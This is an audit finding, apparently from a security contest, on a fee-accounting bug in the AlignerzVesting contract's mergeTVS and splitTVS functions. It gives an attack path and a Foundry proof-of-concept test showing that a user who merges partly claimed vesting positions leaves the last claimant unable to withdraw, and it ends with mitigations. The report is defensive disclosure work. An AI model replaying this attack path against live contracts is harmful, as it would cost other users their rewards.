# [000102] Fee accounting error does not let last user claim his TVS rewards
  
  ### Summary

When a user calls [`mergeTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1002) or [`splitTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1054), fees are calculated based on the full amount of rewards user gets from that TVS. After it is calculated the fee is subtracted from the same full amount:
```solidity
           ...
            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
@>            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
           ...
```
The problem is that it is not verified if the user has already claimed tokens from that TVS or not. If that is the case then the last user that will claim his rewards will not be able to since the vesting contract will not have enough tokens.

### Root Cause

Functions [mergeTVS](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1002) and [splitTVS](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1054) do not take account of TVSs that already have some tokens claimed.
```solidity
            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
```
The contract has a fixed balance of `tokens` that were transfered when launching a reward project. If merging or splitting happens with TVSs that have already reward tokens claimed and `secondsClaimed > 0`, then the vesting contract `token` accounting will be broken.

### Internal Pre-conditions

1. User/Users merge or split TVSs.

### External Pre-conditions

None

### Attack Path

1. Reward project is launched and user has a TVS claimed in it with 1000e18 tokens to claim.
2. He claims almost all of the tokens by calling [claimTokens](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L941) right before the end of the vesting period.
3. Another reward project is launched and user has a TVS claimed in it with 1000e18 tokens to claim.
4. He does the same thing as before and claims right before the end of the vesting period.
5. User calls mergeTVS and merges the 2 TVS together.
6. The fee taken from the contract and transfered to the `treasury` is going to be `20e18`, but user still claims almost all of the 2000e18 tokens.
7. Vesting contract `token` accounting is broken, since token.balanceOf(address(this)) will be less by 20e18 than it should be.
8. All users claim their rewards besides the last one.
9. Last user tries to claim his rewards but it will revert since vesting contract does not have sufficient balance.

### Impact

The accounting of the vesting contract will be broken, not allowing the last user that claims his reward do it. If for example he has claimed nothing, he could lose all of his rewards until more `token` are transfered by launching a project or just transfering to the vesting contract. This does not solve the issue since this will happen everytime a user splits a TVS or merges TVSs. A malicious user could do this at every reward or bidding project and break the accounting of the contract.

### PoC

To compile this test you need to:
1. In the `setUp` function in `AlignerzVestingProtocolTest` set the treasury to another address:
```solidity
        address treasury = makeAddr("treasury");
        vesting.setTreasury(treasury);
```
2. Add the correct `calculateFeeAndNewAmountForOneTVS` function in the `FeesManager` contract, since it normally reverts:
```solidity
    function calculateFeeAndNewAmountForOneTVS_correct(uint256 feeRate, uint256[] memory amounts, uint256 length)
        public
        pure
        returns (uint256 feeAmount, uint256[] memory newAmounts)
    {
        newAmounts = new uint256[](length);
        for (uint256 i; i < length;) {
            feeAmount += calculateFeeAmount(feeRate, amounts[i]);
            newAmounts[i] = amounts[i] - feeAmount;
            unchecked {
                ++i;
            }
        }
    }
```
And change it in the `mergeTVS` function :
```solidity
     ...
        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS_correct(mergeFeeRate, amounts, nbOfFlows);
     ...
```
3. Import the IERC20Errors in the test file:
```solidity
        import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
```
4. Now add this test in the test suite:
```solidity
    function test_PoC_LastUserCantClaim() public {
        vm.startPrank(projectCreator);
        // launch both projects to have 2 TVS for kol
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1);
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1);
        vesting.setMergeFeeRate(100);
        vesting.setSplitFeeRate(100);

        address[] memory kols = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            kols[i] = address(uint160(i + 1));
        }

        uint256[] memory amounts = new uint256[](10);
        for (uint256 i = 0; i < 10; i++) {
            amounts[i] = 1_000e18;
        }

        // set TVS allocation for project 0
        vesting.setTVSAllocation(0, 10_000e18, 30 days, kols, amounts);
        address[] memory attacker = new address[](1);
        attacker[0] = kols[0];
        uint256[] memory amount = new uint256[](1);
        amount[0] = 1_000e18;
        // set TVS allocation for project 1
        vesting.setTVSAllocation(1, 1_000e18, 30 days, attacker, amount);
        console2.log("Vesting contract balance after allocations: ", token.balanceOf(address(vesting)));
        vm.stopPrank();

        // claim TVS for all user
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(kols[i]);
            vesting.claimRewardTVS(0);
        }

        vm.startPrank(kols[0]);
        vesting.claimRewardTVS(1);

        // skip to 1 day before vesting period ends
        vm.warp(block.timestamp + 29 days);

        nft.setApprovalForAll(address(vesting), true);
        // user claims for both TVS
        vesting.claimTokens(0, 1);
        vesting.claimTokens(1, 11);

        uint256[] memory projectIds = new uint256[](1);
        uint256[] memory nftIds = new uint256[](1);
        projectIds[0] = 1;
        nftIds[0] = 11;

        // user merges TVSs
        uint256 vestingBalanceBefore = token.balanceOf(address(vesting));
        vesting.mergeTVS(0, 1, projectIds, nftIds);
        uint256 vestingBalanceAfter = token.balanceOf(address(vesting));
        console2.log("Fee sent to the treasury after merge: ", vestingBalanceBefore - vestingBalanceAfter);

        // skip to the end of the vesting period
        vm.warp(block.timestamp + 2 days);

        // user claims the full TVS
        vesting.claimTokens(0, 1);

        vm.stopPrank();

        // approve and claim for all KOLs besides the last one
        for (uint256 i = 1; i < 9; i++) {
            vm.startPrank(kols[i]);
            nft.setApprovalForAll(address(vesting), true);
            vesting.claimTokens(0, i + 1);
            vm.stopPrank();
            console2.log("Kol", i, "balance: ", token.balanceOf(kols[i]));
        }

        // try to claim for the last kol
        vm.startPrank(kols[9]);
        nft.setApprovalForAll(address(vesting), true);

        // revert since the contract does not have enough balance
        // user can not claim his rewards
        vm.expectRevert(
            abi.encodeWithSelector(
                IERC20Errors.ERC20InsufficientBalance.selector,
                address(vesting),
                token.balanceOf(address(vesting)),
                1_000e18
            )
        );
        vesting.claimTokens(0, 10);

        console2.log(
            "Amount needed for transfer: ", 1000e18, ", amount inside contract: ", token.balanceOf(address(vesting))
        );
        vm.stopPrank();
    }
```

### Mitigation

The way to mitigate this is: 
 1. If you want to keep getting the fee from the full amount of the TVS, then transfer it directly from the user and don't subtract it from the amount when merging or splitting.
 2. If you don't care to keep the logic the same, then calculate the fee based on the remaining amount to be claimed from the TVS, not the full amount including what has already been claimed.
  